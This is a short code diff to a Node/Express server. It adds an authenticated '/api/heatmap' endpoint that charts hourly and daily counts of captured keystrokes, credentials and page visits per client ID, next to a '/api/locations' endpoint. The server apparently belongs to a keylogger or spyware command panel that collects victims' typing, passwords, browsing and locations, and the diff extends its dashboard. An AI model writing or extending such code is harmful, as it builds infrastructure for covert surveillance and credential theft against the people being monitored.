@@ -921,6 +921,36 @@ app.get('/api/stats', requireAuth, (req, res) => {
     });
 });
 
+// ── Activity heatmap: hourly key counts per day of week ──
+app.get('/api/heatmap', requireAuth, (req, res) => {
+    const days = Math.min(parseInt(req.query.days) || 7, 30);
+    const cutoff = Date.now() - days * 86400000;
+    const cid = req.query.clientId;
+
+    // hourly[dayOfWeek][hour] = count
+    const hourly = Array.from({length: 7}, () => new Array(24).fill(0));
+    // daily[dayIndex from today] = count  (0 = today, days-1 = oldest)
+    const daily = new Array(days).fill(0);
+
+    const allEvents = [
+        ...store.keystrokes.map(k => ({ ts: new Date(k.timestamp).getTime(), clientId: k.clientId })),
+        ...(store.credentials || []).map(c => ({ ts: new Date(c.timestamp).getTime(), clientId: c.clientId })),
+        ...store.pageVisits.map(v => ({ ts: new Date(v.timestamp).getTime(), clientId: v.clientId }))
+    ];
+
+    const now = Date.now();
+    allEvents.forEach(ev => {
+        if (!ev.ts || ev.ts < cutoff) return;
+        if (cid && ev.clientId !== cid) return;
+        const d = new Date(ev.ts);
+        hourly[d.getDay()][d.getHours()]++;
+        const dayIdx = Math.floor((now - ev.ts) / 86400000);
+        if (dayIdx >= 0 && dayIdx < days) daily[dayIdx]++;
+    });
+
+    res.json({ hourly, daily, days });
+});
+
 app.get('/api/locations', requireAuth, (req, res) => {
     const limit = Math.min(parseInt(req.query.limit) || 100, 2000);
     const cid = req.query.clientId;
